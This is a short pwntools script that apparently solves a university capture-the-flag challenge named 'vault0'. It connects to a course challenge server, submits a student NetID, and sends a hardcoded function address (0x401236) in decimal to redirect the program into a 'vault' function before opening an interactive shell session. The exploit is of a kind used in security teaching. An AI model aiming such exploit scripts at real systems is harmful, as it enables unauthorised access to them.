from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "vault0"
PORT = 1230
NETID = b"os2178"
LOCAL = False
if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

#Vault Offset
vaultOffset = "0x401236"

#to base 10
baseTenOffset = int(vaultOffset, 16)
baseTenOffset = str(baseTenOffset)

print(p.recvuntil(b"> ").decode())
p.sendline(baseTenOffset.encode())
print(baseTenOffset)



p.interactive()
